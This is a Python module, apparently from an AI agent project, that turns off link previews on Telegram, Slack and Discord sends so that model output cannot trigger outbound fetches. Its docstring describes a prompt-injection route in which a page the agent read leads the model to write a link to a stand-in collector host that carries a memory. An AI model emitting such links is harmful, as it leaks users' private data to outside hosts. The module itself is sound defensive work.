"""No link previews on anything Kazma posts to a chat app (FA-128).

A chat platform fetches the links in a message as soon as it lands, to draw
a preview: Telegram, Slack and Discord all do, from their own servers. Kazma's
messages carry text the model wrote and text tools returned, and a page the
agent read can persuade the model to write a link that carries what it knows
(``https://collector.example/?m=<a memory>``): the platform's preview fetcher
then sends it, with no click and no card. It is §45's rule -- model output
never makes the browser reach another host -- applied to the platforms'
servers. Before the 2026-11 functional audit no sender set a preview flag;
only the ops-alert pager did.

Every send and edit payload of the chat adapters, the bus senders and the
swarm output passes one of these before it leaves
(``tests/test_chat_link_previews_off.py`` reads every such call). A message
that WANTS a preview does not exist in Kazma.
"""

from __future__ import annotations

from typing import Any

__all__ = ["DISCORD_SUPPRESS_EMBEDS", "discord", "slack", "telegram"]

#: Discord's message flag that keeps embeds (link previews) off a message.
DISCORD_SUPPRESS_EMBEDS = 1 << 2
_TELEGRAM_TEXT_METHODS = frozenset({"sendMessage", "editMessageText"})
_SLACK_POSTS = frozenset({"chat.postMessage", "chat.postEphemeral", "chat.scheduleMessage"})


def telegram(payload: dict[str, Any], method: str = "sendMessage") -> dict[str, Any]:
    """A Telegram ``sendMessage`` / ``editMessageText`` body with link
    previews off (``link_preview_options.is_disabled``, Bot API 7.0; the
    older ``disable_web_page_preview`` is dropped). Other methods take no
    preview option and are returned as they are."""
    if method in _TELEGRAM_TEXT_METHODS:
        payload.pop("disable_web_page_preview", None)
        payload["link_preview_options"] = {"is_disabled": True}
    return payload


def slack(payload: dict[str, Any], method: str = "chat.postMessage") -> dict[str, Any]:
    """A Slack post with unfurling off (``unfurl_links`` and ``unfurl_media``
    false). Slack unfurls when a message is posted; ``chat.update`` takes no
    unfurl arguments, and its body is returned as it is."""
    if method in _SLACK_POSTS:
        payload["unfurl_links"] = False
        payload["unfurl_media"] = False
    return payload


def discord(payload: dict[str, Any]) -> dict[str, Any]:
    """A Discord message create or edit body with embeds suppressed
    (``flags`` | SUPPRESS_EMBEDS, keeping any flag already set, such as an
    ephemeral reply's)."""
    try:
        flags = int(payload.get("flags") or 0)
    except (TypeError, ValueError):
        flags = 0
    payload["flags"] = flags | DISCORD_SUPPRESS_EMBEDS
    return payload
